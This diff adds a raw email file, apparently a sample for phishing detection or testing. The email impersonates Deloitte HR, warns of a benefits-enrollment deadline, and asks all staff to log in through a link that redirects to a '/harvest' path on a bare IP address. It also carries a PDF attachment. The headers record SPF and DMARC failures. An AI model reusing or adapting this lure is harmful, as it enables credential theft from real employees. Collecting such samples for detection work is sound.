@@ -1,0 +1,62 @@
+Return-Path: <hr-benefits@deloitte-benefits-portal.net>
+Received: from mail.deloitte-benefits-portal.net (mail.deloitte-benefits-portal.net [178.32.141.203])
+	by mail.corporatetarget.com (Postfix) with ESMTPS id 7B8C9D0E1F2;
+	Tue, 30 Jan 2024 11:15:08 +0000 (UTC)
+Received: from bulk-mailer-3.spamservice.xyz ([196.196.196.47])
+	by mail.deloitte-benefits-portal.net with SMTP;
+	Tue, 30 Jan 2024 11:14:53 +0000
+Authentication-Results: mail.corporatetarget.com;
+	spf=fail;
+	dkim=none;
+	dmarc=fail (p=reject)
+From: "Deloitte HR Benefits Team" <hr-benefits@deloitte-benefits-portal.net>
+To: all-staff@corporatetarget.com
+Subject: Important: Annual Benefits Enrollment - Login Required by Feb 1st
+Date: Tue, 30 Jan 2024 11:14:50 +0000
+Message-ID: <DELOITTE-HR-20240130@deloitte-benefits-portal.net>
+X-Mailer: BulkMailer Pro 4.2
+X-Originating-IP: 196.196.196.47
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_Boundary_20240130"
+
+------=_Part_Boundary_20240130
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html>
+<body style="font-family: Arial, sans-serif;">
+<div style="max-width: 600px; margin: 0 auto;">
+  <div style="background: #86bc25; padding: 20px; text-align: center;">
+    <h2 style="color: white; margin: 0;">Deloitte</h2>
+    <p style="color: white; margin: 5px 0 0;">Human Capital · Benefits Administration</p>
+  </div>
+  <div style="padding: 24px; background: #fff; border: 1px solid #ddd;">
+    <p>Dear Employee,</p>
+    <p>Your <strong>Annual Benefits Enrollment period closes February 1st, 2024</strong>. All employees must log in to confirm or update their benefit selections for 2024, including health insurance, dental, vision, and 401(k) contributions.</p>
+    <p><strong>Failure to confirm your selections by the deadline will result in automatic enrollment in the default plan, which may not reflect your preferred coverage.</strong></p>
+    <p>Please log in using your corporate credentials at the secure benefits portal:</p>
+    <p style="text-align: center;">
+      <a href="https://deloitte-benefits-portal.net/sso/login?redirect=https://196.196.196.47/harvest/deloitte"
+         style="background: #86bc25; color: white; padding: 12px 28px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block;">
+        Access Benefits Portal
+      </a>
+    </p>
+    <p style="font-size: 12px; color: #666; margin-top: 20px;">Deloitte LLP · 30 Rockefeller Plaza, New York, NY 10112</p>
+  </div>
+</div>
+</body>
+</html>
+
+------=_Part_Boundary_20240130
+Content-Type: application/pdf
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="2024_Benefits_Guide.pdf"
+
+JVBERi0xLjQKJdPr6eEKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKPj4K
+ZW5kb2JqCjIgMCBvYmoKPDwKL1R5cGUgL1BhZ2VzCi9LaWRzIFszIDAgUl0KL0NvdW50IDEKPJ4K
+ZW5kb2JqCjMgMCBvYmoKPDwKL1R5cGUgL1BhZ2UKL1BhcmVudCAyIDAgUgovTWVkaWFCb3ggWzAg
+MCAxMCA4XQo+PgplbmRvYmoKeHJlZgowIDQKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwMDA5
+IDAwMDAwIG4gCjAwMDAwMDAwNTggMDAwMDAgbiAKMDAwMDAwMDExNSAwMDAwMCBuIAp0cmFpbGVy
+Cjw8Ci9TaXplIDQKL1Jvb3QgMSAwIFIKPj4Kc3RhcnR4cmVmCjE5NQolJUVPRgo=
+
+------=_Part_Boundary_20240130--
